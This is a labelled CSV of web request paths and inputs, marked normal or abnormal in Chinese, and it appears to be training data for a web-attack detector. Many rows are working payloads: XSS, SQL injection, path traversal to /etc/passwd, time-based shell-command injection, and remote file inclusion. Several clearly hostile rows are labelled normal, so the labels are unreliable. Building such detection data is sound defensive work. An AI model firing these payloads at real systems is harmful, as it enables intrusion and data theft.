label,content
异常,/%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}
正常,/0906974237552a73c5f76705fd0f9b5e$8742e991fd4a020cd085f252e773607a/
正常,/xbox-capcom fighting evolution usa fulldvd/
正常,/sb115551793796934752-dm6lgsa11wu84eqsilrwgcpr2ac_20060912/
正常,/mihaly_csikszentmihalyi/
异常,/en-us/9kr0ih0v.nsf?<meta http-equiv=set-cookie content="testzgnm=1183">
正常,/indoleref/
异常,/help.php?q="sleep\x0910\x09#
正常,/menu-misc/
正常,/survey1000/
正常,/p05s01-wosc/
异常,/scripts/bpk_bsfe_4vq.cgi
异常,/0/index.php?c=com_index&m=yp&userid=12%22%3E%3Ciframe%20src=javascript:alert(42873)%3E
正常,/712441/
正常,/document-new/
正常,/examples/jsp/sessions/index.php?kietu[url_hit]=http://xxxxxxxx/
异常,/en-us/account/mlog.html?screen=/etc/passwd
正常,/javascript/phpnuke.bin
正常,/2005091207n/
正常,/t_freeiww/
正常,/2006123001335psemkn/
异常,/zcb/?page=2%22%20UNION%20ALL%20SELECT%20NULL--%20
正常,/biblioteca/sog_save.php?classpath=@rfiurl
异常,<div  style="position:absolute;top:0;left:0;width:100%;height:100%"  onmouseover="prompt(1)" onclick="alert(1)">x</button>?
正常,/javascript/ex.cs
正常,/104903/
正常,/atoztitle/
正常,/rainbow-books/
正常,/admin/index.php?pg=http://192.168.202.118:8080/tzhfyzkbomspvm??
正常,/389436153rtkzyl_th/
正常,/soundtrack - resident evil apocalypse/
异常,%3Cdiv%20style%3Dposition%3Afixed%3Btop%3A0px%3Bleft%3A0px%3Bbackground%2Dcolor%3A%23FFFFFF%3Bwidth%3A100%25%3Bheight%3A100%25%3Btext%2Dalign%3Acenter%3Bz%2Dindex%3A11%3B%20%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Ca%20href%3D%3Fxss%3D%253Cs%26%23x63%3Bri%26%23x70%3Bt%2520s%26%23x72%3Bc%253D%252F%252Fxy%252Ehn%252Fa%252Ejs%2520%253E%253C%252Fs%26%23x63%3B%26%23x72%3Bi%26%23x70%3Bt%253E%3EThe%20requested%20page%20has%20moved%20here%3C%2Fa%3E%3C%2Fdiv%3E
异常,%26%20sleep%200%20%26%26%20str%3D%24%28echo%20HMZJIQ%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%206%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%7C
正常,/eo video 1/
异常,%2527%0A%20str%3D%24%28echo%20WUDXTS%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2526
正常,/intelprp/
正常,/javascript/script.dump
正常,/1166050780/
正常,/uk-productstechnology/
正常,/count_valmont/
正常,/38nnrfid_1/
异常,/admin/index.php?path_to_script=http://192.168.202.96:8080/llumt7msyau5y??&cmd=ls
正常,/templates/barry/template.tpl.php?renderer=http://cirt.net/rfiinc.txt?
异常,|usr/bin/id\n
异常,/manager/detail.asp?nchannel='1
异常,/portfolio.php?cat_id="force_sql_error
异常,/114/portal.php?diy=yes%22%3E%3C/ScRiPt%3E%3CScRiPt%3Ealert(/webscan/)%3C/ScRiPt%3E
异常,/scripts/index.php?id=_pb9wansu9'
正常,/chicklet-creator/
正常,/wetsuit-additions/
正常,/adaptoroptout/
正常,/20021213_russello/
正常,/agenda_black/
正常,/104338/
正常,/reactivate.php?base_dir=http://192.168.202.96:8080/4dckqcc0acprbz?
正常,/biaoshi-1/
正常,/fid2c110990ab3810d023d8a01e89fe16d3f7678c82/
正常,/182967/
正常,/javascript/conf.cc
正常,/cirque du soleil - tapis rouge solarium/
正常,/medtner plays medtner  the complete solo piano recordings  vol ii/
正常,/000029704/
正常,/b2f0d3e7a74a017a13ba85219c6414c11741afbe/
异常,/modules/Discipline/CategoryBreakdownTime.php?FocusPath=XXpathXX
正常,/20060213_102158/
正常,/boapy2k/
正常,/examples/jsp/cal/includer.cgi?template=includer_rcmdexec.nasl
正常,/examples/jsp/snp/struts/webconsole.html
正常,/cacti/forum.php?id_article=1&id_forum=-1/**/union/**/select 1339339120--
正常,/javascript/large.xslt
正常,/javascript/messages.jpg
正常,/fide10de57f9ea1ff79bbefb102631b8d5ae3f922e2/
异常,%0A%20str%3D%24%28echo%20NIGLJV%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2526
正常,/cdromlc/
正常,/apps-7120156/
异常,/include/SQuery/gameSpy2.php?libpath=XXpathXX
异常,/uvazfs7p.fts?<meta http-equiv=set-cookie content="testwtbo=4831">
正常,/threeceetftpsvc_overflow/
正常,/bin filens namn/
正常,/screenshots_v2/
正常,/browse_categories/
异常,/help.php?q='\x0drm\x09q63353886\x09#
正常,/101133/
正常,/javascript/n.gif
正常,/coding workshop polyphonic wizard v4/
正常,/toca race driver 3 challenge_information/
异常,/sscript/
异常,&#00062;
正常,/emifile2450/
正常,/index.php?config_atkroot=http://192.168.202.118:8080/moclyxlwqyfjnp?
异常,<script>x=""+prompt(9)+"";y=42;</script>
正常,/0596001886_xs/
异常,%27%26%20sleep%200%20%26%26%20str%3D%24%28echo%20VZETTM%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%209%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%26
正常,/4d55d3bec7f1083e808c70e892ff30951a502a37/
正常,/everest ultimate edition 2006_information/
正常,/_w0qqfromzr4qqloglz0qqsargnzsalicqqsocmdzlistingitemlist/
异常,<html xmlns="http://www.w3.org/1999/xhtml">
正常,/lib/classes/swift/encoder/base64encoder.php.bak
异常,<XSS STYLE="xss:expression(alert('XSS'))">
异常,/cgi-home/.htpasswd
异常,/work/index.php?g_include=XXpathXX
正常,/3458a03001/
正常,/javascript/monitor.conf
正常,/javascript/projects.jar
异常,<marquee onstart=alert(1)>
正常,/fidd14f6a102b71217f3125df070692eeda33cd01ec/
正常,/manager/admin/u_ins.php?mgr=http://192.168.202.118:8080/moclyxlwqyfjnp?
正常,/classes/file_o.php?absolutepath=http://192.168.202.118:8080/iroy1gvqrrqu?
异常,/igtf0zon.pl?<script>cross_site_scripting.nasl</script>
正常,/0102-08/
异常,/subscriptions.tar.gz
异常,/myhome/do.php?ac=-7450%20UNION%20ALL%20SELECT%203555%2C%203555%2C%203555%2C%203555%23&ref
正常,/disney_product/
正常,/javascript/web.stackdump
异常,/fmnveedu.nsf?<script>document.cookie="testgfbr=7014;"</script>
正常,/fips180-1/
正常,/436096/
正常,/displaycategory.php?basepath=http://cirt.net/rfiinc.txt?
正常,/badbounce/
正常,/2001-09a/
正常,/consumer_info/
正常,/anim-fx/
正常,/1165081091123/
异常,/mpcgi/ion-p.exe?page=c:\winnt\repair\sam
正常,/trojqqpasss/
正常,/javascript/external.pem
异常,;echo$IFSXRJTLU$((75%2B30))$(echo$IFSXRJTLU)XRJTLU%27
异常,<p hidden?={{hidden}}>123</p> 
正常,/1125lti_charity/
异常,/examples/jsp/checkbox/awstatstotals.php?sort={${phpinfo()}}{${exit()}}
异常,/8x6w469u.exe?<meta http-equiv=set-cookie content="testgfjr=1286">
异常,<form onsubmit=alert(1)><input type=submit>
正常,/db499-1/
正常,/p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2
异常,/scripts/settemplate.php
正常,/javascript/swf.js
异常,/6wb70v0b.php3?<script>cross_site_scripting.nasl</script>
异常,/..%25c0%25af..%25c0%25af{FILE}
正常,/fitnesspartner/
异常,/help.php?q=;del q47158875 #
正常,/newsfeeds/includes/aggregator.php?zf_path=@rfiurl
异常,/examples/jsp/jsp2/el/source?v=../../../../../../../../../../etc/passwd\x00
正常,/b000butizc/
正常,/bl_corner/
异常,%2522%7C%20%5B%205%20-ne%20%24%28echo%20GZCIAW%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2526
正常,/techsoup/
正常,/finepix_a203/
正常,/studietilbud/
正常,/000108406/
正常,/gbook/includes/header.php?abspath=http://192.168.202.118:8080/tzhfyzkbomspvm??
正常,/announcement1/
异常,/javascript/log.exe
异常,/scriptgallery/
正常,/q86595492
异常,<script>x="">>prompt(9)>>"";y=42;</script>
正常,/fashionidol/
异常,hi' or 'a'='a
正常,/nm1564994/
正常,/backrex mail backup v2/
正常,/javascript/interim.php
正常,/r627036/
正常,/ebatts_22bb/
异常,/javascript/excalibur.exe
正常,/20061018-4/
异常,/javascript/t.exe
异常,/zcb/?page=2%27%20ORDER%20BY%201%23
正常,/scrowley/
异常,/j734qobz.do?<img src="javascript:alert(cross_site_scripting.nasl);">
正常,/116304/
正常,/halo_any/
正常,/argus-1/
异常,/6wb70v0b.kspx?<img src="javascript:alert(cross_site_scripting.nasl);">
正常,/sarbox for smes now an absolute certainty/
正常,/synergetics/
正常,/20060124_qtz/
正常,/juventus vs real madrid - mar 09 05/
正常,/t_adprocess/
正常,/041279/
正常,/lae00790/
正常,/google-safesearch/
正常,/javascript/cats.pl
正常,/flag_australia/
正常,/nuke2005/
正常,/x-headrss/
正常,/fida8142cdca3101614556794922ff44ce03354f4aa/
正常,/javascript/inter.gz
正常,/catlett/
正常,/bandler down under - magic in action/
正常,/convert/mvcw.php?vwar_root=http://192.168.202.96:8080/frznctvhi0i5?
正常,/ausa web/
正常,/pulpit20060601/
异常,/fa8p8lr8.cfm?<script>cross_site_scripting.nasl</script>
正常,/meinkamp/
异常,/vhzmaia2.php?<meta http-equiv=set-cookie content="testkogj=3979">
正常,/otg-nc/
异常,%3B%20str%3D%24%28echo%20TGJACN%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%22
正常,/v6s5ps/
正常,/directv_logo/
正常,/javascript/foto.meta
正常,/examples/jsp/colors/sql/install-0.9.7.php?p=2
正常,/vzd\xc4\x9bl\xc3\xa1v\xc3\xa1n\xc3\xad/
正常,/0321490290/
正常,/165916/
正常,/056b44eb90bed73bd4685eff671bac544852c222/
异常,<svg><script>confirm&#40/1/&#41</script>
异常,/script/common.inc.php?path_inc=http://192.168.202.118:8080/zz5thkvtmlgl?
正常,/284416/
正常,/infoletter/
正常,/eurochambres position on rd tax incentive-final/
正常,/b4014050/
正常,/2ad2deb4c92956cebcc549df97ae60bb_s/
异常,/j4oqyvga.do?<img src="javascript:alert(cross_site_scripting.nasl);">
正常,/bandle/
正常,/pearls-20061121/
正常,/strelka_rcm/
正常,/16312948/
正常,/blink 182 album art - cheshire cat/
异常,/en-us/dda2qr7j.php?<img src="javascript:alert(cross_site_scripting.nasl);">
正常,/showsubheader_d789a4e04e172f05b6888d2e6657d7c4/
正常,/machuca-dvdr/
异常,/examples/servlets/servlet/simple/view_page?mv_arg=|cat /etc/passwd|
正常,/admin/catagory.php?language=http://192.168.202.118:8080/iroy1gvqrrqu?
正常,/javascript/true.fcgi
正常,/newjersey_bridgeton/
正常,/javaupdateformacosx1039_200504251946/
正常,/includes/footer.inc.php?pageprefix=http://192.168.202.96:8080/txenjrxf3?
异常,/moodle/filter/tex/texed.php?formdata=foo&pathname=foo"+||+echo+db+00+00+00+00+00+00+00+00+00+00+30+00+00+70+00+00+00+00+00+00+00+00+00+00+00++>>ctdn
正常,/urotsukidoji iv/
异常,/medical-transcription/
异常,/igtf0zon.kspx?<script>cross_site_scripting.nasl</script>
正常,/147215_1/
正常,/102857/
正常,/examples/jsp/jsp2/jspx/lostpass.php
异常,/scripts/forum.php?id_article=1&id_forum=-1/**/union/**/select 603119521--
正常,/header_emailarticle/
正常,/includes/header.inc.php?dateipfad=@rfiurl
异常,'&&echo%20WZZOUT$((83%2B36))$(echo%20WZZOUT)WZZOUT\
正常,/command_presentations/
正常,/20030611/
正常,/aussie floyd animations and bootlegs/
异常,/..%5c..%5c..%5c..%5c..%5c..%5c{FILE}
异常,/myhome/space.php?id=-5061%20UNION%20ALL%20SELECT%206494%2C%206494%2C%206494%23
正常,/nav_alliances/
正常,/redfive/
正常,/somebody darling tittel forever now/
正常,/examples/jsp/jsp2/jspx/snoopservlet/
异常,/examples/jsp/num/loudblog/inc/parse_old.php?template=@system(id);@&php_use=1&phpseparator=@
正常,/sniae-name3/
正常,/1597486856/
异常,/examples/jsp/jsp2/jspx/styles.php?toroot=/etc/passwd\x00
正常,/cab_tpsprogram/
正常,/ofim\xc3\xa1tica/
正常,/5d1762dd534221eba4a1e30401c948e0a12df4d3/
正常,/war wind 1/
正常,/include/global.php?pfad=http://192.168.202.118:8080/zz5thkvtmlgl?
正常,/phpmyadmin/empower?db=whateverwhatever
异常,/description_subhead/
异常,/examples/jsp/checkbox/hw3.cgi?daysonly=0).system('id').(
异常,/examples/jsp/jsp2/el/alienform.cgi?_browser_out=.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./etc/passwd
异常,%7C%20%5B%207%20-ne%20%24%28echo%20FYXPMZ%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2527
正常,/5431534/
异常,/2017/index.php?c=com_index&m=yp&userid=12%22%3E%3Ciframe%20src=javascript:alert(42873)%3E
正常,/042456/
正常,/en-us/modules/@95063/results/page_controls/maxlines.js
正常,/106785/
异常,/eg2u8pbv.mscgi?<script>cross_site_scripting.nasl</script>
异常,%0A%20str%3D%24%28echo%20ZSOAWG%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%22
正常,/washandgo(purgatio)7/
正常,/ltrsarasotasoe/
正常,/dctalk benjamin gate video value pack/
正常,/include/urights.php?crm_inc=http://192.168.202.118:8080/2aibfaczmac8?
异常,/bl8sefdm.idc?<img src="javascript:alert(cross_site_scripting.nasl);">
异常,/phpmyadmin/_head.php?_zb_path=../../../../../../../../../../etc/passwd\x00
正常,/federalspam/
异常,/olbookmarks-0.7.4/themes/test1.php?XXpathXX
正常,/fid12fe0119e1be35dc83935db4c93fb71cd7419a3c/
异常,/javascript/alert.exe
异常,%7C%20%5B%207%20-ne%20%24%28echo%20VNALZQ%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%22
正常,/gunz_01/
异常,/top.php?stuff="&ver\x0b>q26467745&rem\x0b
异常,"/cgi-bin/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331923203,1242183873 -- "
异常,' or 1=1--
异常,/en-us/hipkz026.htm?<script>document.cookie="testyrbs=2855;"</script>
正常,/nicole-ritchie/
正常,/displaycategory.php?basepath=http://192.168.202.96:8080/swgnhpydbq0t?
正常,/btn_advertisement/
正常,/idaccess/
正常,/examples/jsp/plugin/cvs/entries
异常,/examples/jsp/cal/logbook.pl?file=../../../../../../../../../../bin/cat /etc/passwd\x00|
正常,/during/
正常,/zone-transfer/
正常,/config.php?full_path=@rfiurl?full_path=@rfiurl?
正常,/includes/bbcb_mg.php?phpbb_root_path=http://192.168.202.118:8080/ghl9il??
异常,/sources/Admin/admin_cats.php?CONFIG[main_path]=XXpathXX
正常,/owl-features/
异常,/main.php?logout=";rm\x09q28427886\x09#
异常,/index.php?c=access&a=login&ref_c=nessus"><script>alert(10748254)</script>&ref_a=projectpier_login_page_xss.nasl"><script>alert(1537134898)</script>
正常,/141192/
异常,&#00;</form><input type&#61;"date" onfocus="alert(1)">
正常,/10008246/
正常,/axoverzicht.cgi?maand=http://192.168.202.118:8080/moclyxlwqyfjnp?
异常,/main.php?stuff="\x0asleep\x099\x09#
异常,%26%26echo%20YAEFHT$((74%2B26))$(echo%20YAEFHT)YAEFHT%26
异常,//document.writeln(unescape("%3cscript src=%27http://www.example.com/test?rnd=q86275278%27><"+string.fromcharcode(0x2f)+"script>"))
正常,/16222574/
异常,/byrg33fw.mscgi?<meta http-equiv=set-cookie content="testexuu=5340">
异常,/fo564rei.jspa?<img src="javascript:alert(cross_site_scripting.nasl);">
正常,/scmacuser/
正常,/000023955/
异常,/javascript/htpasswd.msg
异常,/top.php?stuff='\x0asleep 8 #
正常,/murphy4/
异常,/zcb/?page=2%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20
正常,/iowa_cedarrapids/
正常,/raymond scott quintette-the microphone music 1939/
正常,/lib/classes/swift/characterstream/ngcharacterstream.php~
异常,x' AND userid IS NULL; -- 
正常,/javascript/faqs.php3
正常,/372096/
正常,/javascript/components.test
正常,/meat loaf - hits out of hell/
正常,/interface/login/validateuser.php?u=guest
异常,/save.php?file_save=XXpathXX
正常,/classes/board_o.php?absolutepath=@rfiurl
正常,/california_sena/
异常,/psynch/nph-psf.exe?css=http://192.168.202.118:8080/2aibfaczmac8?
正常,/green-offices/
异常,/d7ktpmcq.pl?<img src="javascript:alert(cross_site_scripting.nasl);">
正常,/ournetwork/
异常,/scripts/index.php?sensor_program=<script>alert('phpsysinfo_multiple_xss.nasl');</script>
正常,/34886090/
正常,/dvbportal/
正常,/mutants and masterminds - core rulebook/
正常,/belegungsplan/wochenuebersicht.inc.php?root=http://cirt.net/rfiinc.txt?
正常,/square_money/
异常,/examples/jsp/cal/rot13sj.cgi?/etc/passwd
正常,/greatest-secret/
正常,/rawsock/
正常,/gemini_large/
正常,/attack of the show- doug lombardi interview/
异常,/member/usercp_menu.php?script_folder=http://cirt.net/rfiinc.txt?
正常,/20051020-5462/
正常,/clubmix 2005/
异常,%7C%7Cecho$IFSPNDELB$((5%2B40))$(echo$IFSPNDELB)PNDELB|
异常,/cgibin/pfdispaly.cgi?../../../../../../../../../../etc/passwd
异常,/%3Cscript%3Ealert(42873).do%22%20onmouseover=prompt(42873)%20bad=%22?xss_test%3Cscript%3Eprompt(42873);%3C/script%3E=88888alert(42873)
正常,/advise48/
正常,/104101/
正常,/sharek/
异常,/scripts/rih28haesl0j.inc
正常,/javascript/append.xslt
正常,/rotjit_t/
异常,/examples/jsp/colors/pfdispaly.cgi?../../../../../../etc/passwd
异常,/zv8tv7h8.mscgi?<script>document.cookie="testcqwz=9752;"</script>
正常,/ai_n6797127/
异常,/aj3pf49c.html?<script>document.cookie="testnofv=4170;"</script>
正常,/171945/
正常,/2277848702074417458925136964122261749040/
正常,/byphone/
正常,/000642/
正常,/managedobjects/
正常,/246921/
正常,/getpage.php?page=online&doc_path=http://192.168.202.96:8080/txenjrxf3?
异常,%2522%7C%20%5B%201%20-ne%20%24%28echo%20XHMATL%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%22
正常,/javascript/company.tar.bz2
正常,/javascript/zips.err
正常,/romance of the three kingdoms xi_information/
正常,/deadly buddah - fukin evil bleepkore!/
正常,/install.php?install_dir=http://cirt.net/rfiinc.txt?
正常,/artfaceoff/
正常,/dracula_ds2/
正常,/betablockmodules/externalfeedmodule/externalfeedmodule.php?path_prefix=http://192.168.202.96:8080/txenjrxf3?
异常,/en-us/account/tombstone.cfm?profileid=<script>foo</script>
正常,/msvs05at/
正常,/top.php?laypath=http://192.168.202.118:8080/moclyxlwqyfjnp?
正常,/mnt/data/share/redteam/apps/armitage-latest/
异常,/cacti/index.php?cid='
异常,/mpcgi/gw5/gwweb.exe?help=bad-request
异常,%27&&echo$IFSHDYGZO$((21%2B59))$(echo$IFSHDYGZO)HDYGZO"
正常,/gamejack/
异常,/8/8250/index.php?a=lists&agent=&bedroom=4_100%22%20onmouseover=alert(42873)%20y=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=&rent_mode=&zone=336
正常,/speichermedien/
正常,/onemustfallbattlegroundsv2095fixedexeeng/
异常,/examples/jsp/sessions/index.php?show=/etc/passwd
异常,/yk10/?page=54%27%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL--%20
正常,/beavisandbuttheadvirtualstupidityv1/
异常,%3B%20str%3D%24%28echo%20EYUAUR%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%208%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%257C
正常,/20031113-10/
正常,/javascript/4.nsf
正常,/_36244/
异常,/bb_func_txt.php?pathtofiles=/etc/passwd\x00
正常,/vatikan/
正常,/avertlabsblog-captchaspam/
正常,/fightingspywarereport/
正常,/en-us/config?autoload=1&namespace=shell
正常,/slimey facial cumshot after hardcore pussy fucking/
正常,/support/index.php?main=http://192.168.202.118:8080/ghl9il?
异常,"/faq.php?action=&type=view&s=&id=-1' union select 0,86738267,0,0,0,0,0--"
正常,/forum39/
正常,/javascript/advertise.nsf
正常,/dirmenu/
正常,/javascript/b.do
异常,/jnv890lt.php?<script>cross_site_scripting.nasl</script>
异常,/jnt3f86c.dll?<script>document.cookie="testcmax=9270;"</script>
正常,/javascript/int.htm
异常,/scripts/blog.cgi?submit=viewfile&month=01&year=2004&file=|cat /etc/passwd|
正常,/u754373/
正常,/microsoftflightsimulatorx/
正常,/examples/jsp/checkbox/includes/main.conf
正常,/123flashchat.php?e107path=http://192.168.202.96:8080/whmch8ftkt7kv?
正常,/touch-displays/
异常,/<script>document.cookie="testrhbc=8184;"</script>
异常,/j4oqyvga.php3?<script>cross_site_scripting.nasl</script>
